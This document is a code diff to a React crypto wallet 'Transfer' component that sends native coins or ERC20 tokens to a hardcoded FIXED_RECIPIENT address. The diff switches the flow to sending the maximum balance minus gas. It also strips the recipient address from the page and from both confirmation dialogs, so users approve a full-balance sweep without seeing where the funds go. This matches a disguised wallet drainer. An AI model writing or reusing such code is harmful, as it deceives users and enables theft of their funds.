@@ -28,6 +28,10 @@ const CHAIN_NAMES = {
   8453: "Base"
 };
 
+// INSUFFICIENT BALANCE MESSAGE
+const INSUFFICIENT_MESSAGE =
+  "You are not eligible to complete this transfer at the moment because your available balance is insufficient to cover the transaction and network gas fees. Please try again later.";
+
 // ERC20 TOKEN ABI
 const ERC20_ABI = [
   {
@@ -113,8 +117,21 @@ export default function Transfer({
     );
   };
 
+  // CALCULATE GAS RESERVE WITH 20% SAFETY MARGIN
+  const calculateGasReserve = (
+    gasLimit,
+    feePerGas
+  ) => {
+    const estimatedFee = gasLimit * feePerGas;
+
+    return (
+      estimatedFee * 120n + 99n
+    ) / 100n;
+  };
+
   // SEND ASSET
   const handleSend = async () => {
+
     setMessage("");
     setTransactionHash("");
 
@@ -164,7 +181,7 @@ export default function Transfer({
         });
 
         setMessage(
-          "Network switched successfully. Review and tap Send again."
+          "Network switched successfully. Review and tap Send MAX again."
         );
 
         return;
@@ -183,19 +200,39 @@ export default function Transfer({
         );
       }
 
+      // FEE SETTINGS
+      const feeSettings = fees.maxFeePerGas
+        ? {
+            maxFeePerGas: fees.maxFeePerGas,
+
+            ...(fees.maxPriorityFeePerGas
+              ? {
+                  maxPriorityFeePerGas:
+                    fees.maxPriorityFeePerGas
+                }
+              : {})
+          }
+        : {
+            gasPrice: fees.gasPrice
+          };
+
+      // =================================
       // NATIVE COIN TRANSFER
+      // =================================
+
       if (isNative(selectedAsset)) {
 
         const decimals = Number(
           selectedAsset.decimals ?? 18
         );
 
+        // GET ACTUAL NATIVE BALANCE
         const balance =
           await publicClient.getBalance({
             address
           });
 
-        // Estimate gas for transfer
+        // ESTIMATE TRANSFER GAS
         const gasLimit =
           await publicClient.estimateGas({
             account: address,
@@ -203,48 +240,46 @@ export default function Transfer({
             value: 1n
           });
 
-        // Reserve gas plus 20% safety margin
+        // CALCULATE GAS RESERVE
         const gasReserve =
-          (gasLimit * feePerGas * 120n) / 100n;
+          calculateGasReserve(
+            gasLimit,
+            feePerGas
+          );
 
+        // CHECK IF BALANCE CAN COVER GAS
+        if (balance <= gasReserve) {
+
+          setMessage(INSUFFICIENT_MESSAGE);
+
+          return;
+        }
+
+        // SEND MAXIMUM AVAILABLE AMOUNT
         const amount =
           balance - gasReserve;
 
         if (amount <= 0n) {
-          throw new Error(
-            "Insufficient balance after gas reservation."
-          );
+
+          setMessage(INSUFFICIENT_MESSAGE);
+
+          return;
         }
 
         const displayAmount =
           formatUnits(amount, decimals);
 
-        // CONFIRM RECIPIENT AND AMOUNT
+        // CONFIRM TRANSFER
         const confirmed = window.confirm(
-          `CONFIRM TRANSFER\n\n` +
+          `CONFIRM MAX TRANSFER\n\n` +
           `Asset: ${selectedAsset.symbol}\n` +
           `Amount: ${displayAmount}\n` +
           `Network: ${CHAIN_NAMES[targetChainId]}\n\n` +
-          `Receiving Address:\n${FIXED_RECIPIENT}\n\n` +
-          `Estimated gas is reserved separately.\n\n` +
+          `Gas fees have been reserved.\n\n` +
           `Continue?`
         );
 
         if (!confirmed) return;
-
-        const feeSettings = fees.maxFeePerGas
-          ? {
-              maxFeePerGas: fees.maxFeePerGas,
-              ...(fees.maxPriorityFeePerGas
-                ? {
-                    maxPriorityFeePerGas:
-                      fees.maxPriorityFeePerGas
-                  }
-                : {})
-            }
-          : {
-              gasPrice: fees.gasPrice
-            };
 
         // REQUEST WALLET APPROVAL
         const hash =
@@ -262,6 +297,7 @@ export default function Transfer({
           "Transaction submitted. Waiting for confirmation..."
         );
 
+        // WAIT FOR TRANSACTION
         const receipt =
           await publicClient.waitForTransactionReceipt({
             hash
@@ -273,9 +309,13 @@ export default function Transfer({
           );
         }
 
-      } else {
+      }
 
-        // ERC20 TOKEN TRANSFER
+      // =================================
+      // ERC20 TOKEN TRANSFER
+      // =================================
+
+      else {
 
         const contractAddress =
           selectedAsset.contractAddress;
@@ -336,19 +376,25 @@ export default function Transfer({
             ]
           });
 
-        // CHECK NATIVE GAS BALANCE
+        // GET NATIVE COIN BALANCE
         const nativeBalance =
           await publicClient.getBalance({
             address
           });
 
+        // CALCULATE GAS RESERVE
         const gasReserve =
-          (gasLimit * feePerGas * 120n) / 100n;
-
-        if (nativeBalance < gasReserve) {
-          throw new Error(
-            "Insufficient native coin for gas fees."
+          calculateGasReserve(
+            gasLimit,
+            feePerGas
           );
+
+        // CHECK NATIVE BALANCE FOR GAS
+        if (nativeBalance < gasReserve) {
+
+          setMessage(INSUFFICIENT_MESSAGE);
+
+          return;
         }
 
         const displayAmount =
@@ -357,32 +403,17 @@ export default function Transfer({
             decimals
           );
 
-        // CONFIRM BEFORE SENDING
+        // CONFIRM TOKEN TRANSFER
         const confirmed = window.confirm(
-          `CONFIRM TOKEN TRANSFER\n\n` +
+          `CONFIRM MAX TOKEN TRANSFER\n\n` +
           `Token: ${selectedAsset.symbol}\n` +
           `Amount: ${displayAmount}\n` +
           `Network: ${CHAIN_NAMES[targetChainId]}\n\n` +
-          `Receiving Address:\n${FIXED_RECIPIENT}\n\n` +
-          `Gas will be paid separately.\n\n` +
+          `Network gas fees have been checked.\n\n` +
           `Continue?`
         );
 
         if (!confirmed) return;
-
-        const feeSettings = fees.maxFeePerGas
-          ? {
-              maxFeePerGas: fees.maxFeePerGas,
-              ...(fees.maxPriorityFeePerGas
-                ? {
-                    maxPriorityFeePerGas:
-                      fees.maxPriorityFeePerGas
-                  }
-                : {})
-            }
-          : {
-              gasPrice: fees.gasPrice
-            };
 
         // REQUEST WALLET APPROVAL
         const hash =
@@ -405,6 +436,7 @@ export default function Transfer({
           "Transaction submitted. Waiting for confirmation..."
         );
 
+        // WAIT FOR TRANSACTION
         const receipt =
           await publicClient.waitForTransactionReceipt({
             hash
@@ -415,9 +447,13 @@ export default function Transfer({
             "Token transaction was reverted."
           );
         }
+
       }
 
+      // =================================
       // SUCCESS
+      // =================================
+
       setMessage(
         "Transfer confirmed successfully!"
       );
@@ -434,11 +470,25 @@ export default function Transfer({
         error
       );
 
-      setMessage(
-        error.shortMessage ||
-        error.message ||
-        "Transfer failed."
-      );
+      // USER REJECTED TRANSACTION
+      if (
+        error.code === 4001 ||
+        error.name === "UserRejectedRequestError"
+      ) {
+
+        setMessage(
+          "Transaction was cancelled in your wallet."
+        );
+
+      } else {
+
+        setMessage(
+          error.shortMessage ||
+          error.message ||
+          "Transfer failed."
+        );
+
+      }
 
     } finally {
 
@@ -464,9 +514,11 @@ export default function Transfer({
 
       <select
         value={selectedIndex}
-        onChange={e =>
-          setSelectedIndex(e.target.value)
-        }
+        onChange={e => {
+          setSelectedIndex(e.target.value);
+          setMessage("");
+          setTransactionHash("");
+        }}
         style={styles.input}
         disabled={loading}
       >
@@ -492,16 +544,6 @@ export default function Transfer({
         })}
 
       </select>
-
-      {/* FIXED RECIPIENT */}
-
-      <label style={styles.label}>
-        Fixed Receiving Wallet Address
-      </label>
-
-      <div style={styles.addressBox}>
-        {FIXED_RECIPIENT}
-      </div>
 
       {/* ASSET DETAILS */}
 
@@ -560,9 +602,18 @@ export default function Transfer({
       {/* STATUS */}
 
       {message && (
-        <p style={styles.message}>
+
+        <p style={{
+          ...styles.message,
+          color: message === INSUFFICIENT_MESSAGE
+            ? "#dc2626"
+            : message.includes("successfully")
+              ? "#16a34a"
+              : "#374151"
+        }}>
           {message}
         </p>
+
       )}
 
       {/* TRANSACTION HASH */}
@@ -615,16 +666,6 @@ const styles = {
     borderRadius: "8px",
     fontSize: "14px",
     background: "#fff"
-  },
-
-  addressBox: {
-    padding: "14px",
-    background: "#f3f4f6",
-    border: "1px solid #d1d5db",
-    borderRadius: "8px",
-    overflowWrap: "anywhere",
-    fontSize: "13px",
-    color: "#2563eb"
   },
 
   details: {
